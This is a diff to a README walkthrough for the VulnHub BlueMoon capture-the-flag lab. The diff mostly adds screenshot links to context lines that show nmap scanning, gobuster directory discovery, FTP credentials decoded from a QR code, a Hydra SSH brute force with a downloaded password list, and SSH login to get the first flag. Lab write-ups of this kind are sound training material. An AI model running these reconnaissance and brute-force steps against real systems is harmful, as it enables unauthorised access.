@@ -26,7 +26,7 @@ ifconfig
 ```bash
 nmap -sP 192.168.56.0/24
 ```
-
+![alt text](https://github.com/denniiyyy/BlueMoon-2021-VulnHub-Walkthrough/blob/8f0d30e149a3bf52605197797451d3c289ff7a27/images/scanning.png)
 > Identify the BlueMoon machine IP (`192.168.56.101`)
 
 ---
@@ -36,7 +36,7 @@ nmap -sP 192.168.56.0/24
 ```bash
 nmap 192.168.56.101
 ```
-
+![alt text](https://github.com/denniiyyy/BlueMoon-2021-VulnHub-Walkthrough/blob/8f0d30e149a3bf52605197797451d3c289ff7a27/images/searchopenport.png)
 **Open ports found:**
 | Port | Service |
 |------|---------|
@@ -49,13 +49,13 @@ nmap 192.168.56.101
 ## Step 4 — Web HTTP
 
 Visit `http://192.168.56.101` in your browser. Nothing useful found.
-
+![alt text](https://github.com/denniiyyy/BlueMoon-2021-VulnHub-Walkthrough/blob/8f0d30e149a3bf52605197797451d3c289ff7a27/images/http.png)
 Run Gobuster to find hidden directories:
 
 ```bash
 gobuster dir -u http://192.168.56.101 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
 ```
-
+![alt text](https://github.com/denniiyyy/BlueMoon-2021-VulnHub-Walkthrough/blob/8f0d30e149a3bf52605197797451d3c289ff7a27/images/gobuster.png)
 > Found: `/hidden_text`
 
 ---
@@ -63,11 +63,12 @@ gobuster dir -u http://192.168.56.101 -w /usr/share/wordlists/dirbuster/director
 ## Step 5 — Explore Hidden Directory
 
 - Go to `http://192.168.56.101/hidden_text`
+![alt text](https://github.com/denniiyyy/BlueMoon-2021-VulnHub-Walkthrough/blob/8f0d30e149a3bf52605197797451d3c289ff7a27/images/hidden.png)
 - Click the **"Thank you…"** link
 - A **QR code image** will appear — download it
-
+![alt text](https://github.com/denniiyyy/BlueMoon-2021-VulnHub-Walkthrough/blob/8f0d30e149a3bf52605197797451d3c289ff7a27/images/qr.png)
 Decode the QR code at [https://zxing.org/w/decode.jspx](https://zxing.org/w/decode.jspx)
-
+![alt text](https://github.com/denniiyyy/BlueMoon-2021-VulnHub-Walkthrough/blob/8f0d30e149a3bf52605197797451d3c289ff7a27/images/decode.png)
 **Credentials found:**
 ```
 USER: userftp
@@ -81,7 +82,7 @@ PASSWORD: ftpp@ssword
 ```bash
 ftp 192.168.56.101
 ```
-
+![alt text](https://github.com/denniiyyy/BlueMoon-2021-VulnHub-Walkthrough/blob/8f0d30e149a3bf52605197797451d3c289ff7a27/images/ftp.png)
 List and download files:
 
 ```bash
@@ -89,17 +90,21 @@ ls
 get information.txt
 get p_lists.txt
 ```
-
+![alt text](https://github.com/denniiyyy/BlueMoon-2021-VulnHub-Walkthrough/blob/8f0d30e149a3bf52605197797451d3c289ff7a27/images/getftp.png)
 Read the files:
 
 ```bash
 cat information.txt
+```
+![alt text](https://github.com/denniiyyy/BlueMoon-2021-VulnHub-Walkthrough/blob/8f0d30e149a3bf52605197797451d3c289ff7a27/images/catinformation.png)
+```bash
 cat p_lists.txt
 ```
+![alt text](https://github.com/denniiyyy/BlueMoon-2021-VulnHub-Walkthrough/blob/8f0d30e149a3bf52605197797451d3c289ff7a27/images/catp_lists.png)
 
 > `information.txt` reveals a username: **robin**  
 > `p_lists.txt` is a password list
-
+![alt text]()
 ---
 
 ## Step 7 — Brute Force SSH with Hydra
@@ -107,13 +112,13 @@ cat p_lists.txt
 ```bash
 hydra -l robin -P p_lists.txt ssh://192.168.56.101
 ```
-
+![alt text]()
 **Credentials found:**
 ```
 Login: robin
 Password: k4rv3ndh4nh4ck3r
 ```
-
+![alt text]()
 ---
 
 ## Step 8 — SSH Login & First Flag
@@ -121,12 +126,12 @@ Password: k4rv3ndh4nh4ck3r
 ```bash
 ssh robin@192.168.56.101
 ```
-
+![alt text]()
 ```bash
 ls -l
 cat user1.txt
 ```
-
+![alt text]()
 > 🚩 **Flag 1 obtained!**
 
 ---
